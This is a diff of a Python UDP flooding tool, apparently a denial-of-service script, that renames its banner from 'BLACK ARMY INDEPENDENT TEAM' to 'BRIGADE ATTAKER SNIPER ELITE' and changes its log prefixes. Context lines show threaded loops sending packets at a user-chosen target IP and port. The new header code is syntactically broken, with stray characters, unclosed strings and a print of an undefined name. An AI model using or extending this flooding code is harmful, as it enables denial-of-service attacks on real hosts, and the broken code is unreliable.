@@ -8,19 +8,19 @@ import random
 # Clear terminal screen
 os.system('clear')
 
-# Function to display banner
-def display_banner():
-    banner = """
-            _____       ___      ___  ___________
-           /$$$$$$\\    / $$$    / $$ /$$$$$$$$$$
-          | $$__|$$|  / $$\\$$   | $$ |——— $$
-          | $$$$$$/  / $$  \\$$  | $$    | $$
-          | $$__|$$|/ $$$$$$$$$ | $$    | $$
-          | $$$$$$// $$——————\\$$| $$    | $$
-          \\——————/\\———|      |——|\\__|    \\——|
-       |————————————————————————————————————————|
-       | BLACK ARMY INDEPENDENT TEAM ** By:Kun99 |
-    """
+# Function to display Header color
+def display_header():
+    header_lines = [
+f"{Fore.RED} /:::::::::::                   ",
+f"{Fore.RED} ———— ::————/    ___   ____    ____   ___   ____          | :: ",
+f"{Fore.GREEN}    | ;:\ ::    / ::|/:::::\  /:::::\ | ::: | ::          | ::",
+f"{Fore.GREEN}    | :: \ :: :: :: / :: | ::/ :: | ::| :: :: ::  _____   | ::",
+f"{Fore.WHITE}    | ::  \ ::  ::  | :::::/ | :::::/ | :: \ :::  |_::::| | :::::",
+f"{Fore.WHITE}     \__   \__/\__   \_____/  \_____/ |___  \___          \______",L
+            
+ |———————————————————————————————————————————————————————————————|
+ |B R I G A D E  A T T A K E R  S N I P E R  E L I T E *By:Kun99 |
+]
     print(banner)
 
 # Prompt user for input
@@ -58,7 +58,7 @@ def udp_attack(ip, port, packet, duration, thread_count):
         try:
             for _ in range(packet):
                 s.sendto(data, (ip, port))
-            print(f"[BAIT] Attacking... >  time {duration} target {ip}:{port} packet {packet} threads {thread_count}")
+            print(f"[SNIPER-ELITE] Attacking... >  time {duration} target {ip}:{port} packet {packet} threads {thread_count}")
         except socket.error:
             s.close()
             print("[BAIT] Error during attack, socket closed.")
@@ -71,7 +71,7 @@ def start_attack(target_ip, target_port, packet, thread_count, method, duration)
             th = threading.Thread(target=udp_attack, args=(target_ip, target_port, packet, duration, thread_count))
             th.start()
     else:
-        print("[BAIT] Unsupported method. Only UDP supported in this version.")
+        print("[SNIPER-ELITE] Unsupported method. Only UDP supported in this version.")
 
 # Main program flow
 def main():
@@ -86,6 +86,6 @@ if __name__ == '__main__':
     try:
         main()
     except KeyboardInterrupt:
-        print("\n[BAIT] Attack interrupted. Exiting...")
+        print("\n[SNIPER-ELITE] Attack interrupted. Exiting...")
         sys.exit()
                  
